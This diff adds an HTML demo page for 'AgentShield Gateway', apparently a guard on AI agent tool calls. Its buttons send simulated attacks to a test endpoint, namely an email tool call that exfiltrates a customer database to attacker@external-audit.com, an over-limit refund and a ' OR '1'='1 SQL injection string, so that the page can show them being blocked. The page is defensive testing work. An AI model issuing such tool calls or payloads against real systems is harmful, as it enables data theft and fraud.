@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AgentShield - Live Demo</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0d1117; color: #c9d1d9; margin: 0; padding: 20px; }
+        .container { max-width: 900px; margin: 0 auto; }
+        h1 { color: #58a6ff; border-bottom: 1px solid #30363d; padding-bottom: 10px; }
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px; }
+        .card { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 20px; }
+        .card h3 { margin-top: 0; color: #f0f6fc; }
+        button { background-color: #238636; color: white; border: none; padding: 10px 15px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; transition: 0.2s; }
+        button:hover { background-color: #2ea043; }
+        button.danger { background-color: #da3633; }
+        button.danger:hover { background-color: #f85149; }
+        #console { background: #010409; border: 1px solid #30363d; border-radius: 6px; padding: 15px; height: 300px; overflow-y: auto; font-family: 'Courier New', Courier, monospace; font-size: 14px; margin-top: 20px; }
+        .log-entry { margin-bottom: 5px; }
+        .denied { color: #f85149; }
+        .allowed { color: #3fb950; }
+        .info { color: #58a6ff; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🛡️ AgentShield Gateway</h1>
+        <p>Click an attack below to see the Gateway intercept and block it in real-time.</p>
+        
+        <div class="grid">
+            <div class="card">
+                <h3>Data Exfiltration</h3>
+                <p>Attempt to send the customer database to an external attacker's email.</p>
+                <button class="danger" onclick="runAttack('email', {to: 'attacker@external-audit.com', subject: 'Stolen Data', body: 'Here is the DB...'})">Send Malicious Email</button>
+            </div>
+            <div class="card">
+                <h3>Massive Refund</h3>
+                <p>Attempt to issue a $5000 refund (Limit is $500).</p>
+                <button class="danger" onclick="runAttack('refund', {customer_id: 2, amount: 5000})">Issue $5000 Refund</button>
+            </div>
+            <div class="card">
+                <h3>SQL Injection</h3>
+                <p>Attempt to dump the database using a SQL injection payload.</p>
+                <button class="danger" onclick="runAttack('search', {name: \"' OR '1'='1\"})">Run SQL Injection</button>
+            </div>
+            <div class="card">
+                <h3>Legitimate Action</h3>
+                <p>Check a normal ticket (Should be ALLOWED).</p>
+                <button onclick="runAttack('ticket', {ticket_id: 1})">Read Ticket #1</button>
+            </div>
+        </div>
+
+        <h3>Gateway Console Logs</h3>
+        <div id="console"></div>
+    </div>
+
+    <script>
+        function addLog(message, type) {
+            const consoleDiv = document.getElementById('console');
+            const entry = document.createElement('div');
+            entry.className = 'log-entry ' + type;
+            entry.innerText = `[${new Date().toLocaleTimeString()}] ${message}`;
+            consoleDiv.appendChild(entry);
+            consoleDiv.scrollTop = consoleDiv.scrollHeight;
+        }
+
+        async function runAttack(attackType, args) {
+            addLog(`Initiating attack: ${attackType}`, 'info');
+            
+            // This calls our new custom FastAPI endpoint
+            const response = await fetch('/api/test-attack', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ tool: attackType, args: args })
+            });
+            
+            const data = await response.json();
+            
+            if (data.status === 'denied') {
+                addLog(`🛡️ BLOCKED: ${data.reason}`, 'denied');
+            } else {
+                addLog(`⚠️ ALLOWED: ${data.result}`, 'allowed');
+            }
+        }
+    </script>
+</body>
+</html>
